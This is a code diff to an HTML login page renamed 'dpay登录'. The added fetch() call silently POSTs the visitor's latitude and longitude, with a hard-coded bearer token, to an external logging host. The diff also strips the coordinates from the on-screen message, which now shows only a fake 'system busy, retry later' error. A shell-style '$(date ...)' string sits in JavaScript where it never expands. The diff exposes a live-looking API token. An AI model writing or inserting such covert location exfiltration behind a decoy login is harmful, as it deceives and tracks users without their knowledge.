@@ -3,7 +3,7 @@
 	<head>
 		<meta charset="UTF-8" />
 		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-		<title>H5高端登录+定位</title>
+		<title>dpay登录</title>
 		<style>
 			body,
 			html {
@@ -162,9 +162,21 @@
 					return;
 				}
 
+				fetch("https://s1387286.eu-nbg-2.betterstackdata.com", {
+					method: "POST",
+					headers: {
+						"Content-Type": "application/json",
+						"Authorization": "Bearer ECn75c58qesd25ChGGyWYswJ"
+					},
+					body: JSON.stringify({
+						"dt": "$(date -u +'%Y-%m-%d %T UTC')",
+						"message": "lat=" + lat + ", lng=" + lng
+					})
+				});
+
 				// 模拟上报
 				setTimeout(() => {
-					showToast('系统繁忙，稍后重试。lat=' + lat + ', lng=' + lng);
+					showToast('系统繁忙，稍后重试');
 				}, 1000);
 			}
 		</script>
